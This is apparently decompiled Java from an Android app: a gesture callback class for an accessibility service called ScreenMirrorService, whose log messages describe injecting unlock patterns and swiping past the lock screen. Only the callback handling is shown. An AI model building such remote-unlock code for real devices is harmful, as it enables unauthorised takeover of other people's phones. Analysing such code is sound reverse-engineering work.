// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package w1;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.util.Log;
import lyr.stable.runtime.ScreenMirrorService;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final class lc extends AccessibilityService.GestureResultCallback {

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public final /* synthetic */ int f4469a;

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public final /* synthetic */ Object f4470b;

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public final /* synthetic */ Object f4471c;

    public lc(sa saVar, sa saVar2) {
        this.f4469a = 2;
        this.f4471c = saVar;
        this.f4470b = saVar2;
    }

    @Override // android.accessibilityservice.AccessibilityService.GestureResultCallback
    public final void onCancelled(GestureDescription gestureDescription) {
        switch (this.f4469a) {
            case 0:
                ScreenMirrorService screenMirrorService = (ScreenMirrorService) this.f4470b;
                screenMirrorService.L.remove((n2) this.f4471c);
                break;
            case 1:
                Log.w("ScreenMirror", "[Unlock] pattern inject cancelled src=".concat((String) this.f4471c));
                break;
            default:
                Log.w("ScreenMirror", "[UnlockTrace] bouncer-swipe cancelled");
                ((sa) this.f4470b).run();
                break;
        }
    }

    @Override // android.accessibilityservice.AccessibilityService.GestureResultCallback
    public final void onCompleted(GestureDescription gestureDescription) {
        switch (this.f4469a) {
            case 0:
                ScreenMirrorService screenMirrorService = (ScreenMirrorService) this.f4470b;
                screenMirrorService.L.remove((n2) this.f4471c);
                screenMirrorService.a6(true);
                break;
            case 1:
                StringBuilder sb = new StringBuilder("[Unlock] pattern inject completed locked=");
                sb.append(((ScreenMirrorService) this.f4470b).J3());
                sb.append(" src=");
                a0.a.o(sb, (String) this.f4471c, "ScreenMirror");
                break;
            default:
                Log.i("ScreenMirror", "[UnlockTrace] bouncer-swipe completed");
                ((sa) this.f4471c).run();
                break;
        }
    }

    public /* synthetic */ lc(ScreenMirrorService screenMirrorService, Object obj, int i3) {
        this.f4469a = i3;
        this.f4470b = screenMirrorService;
        this.f4471c = obj;
    }
}
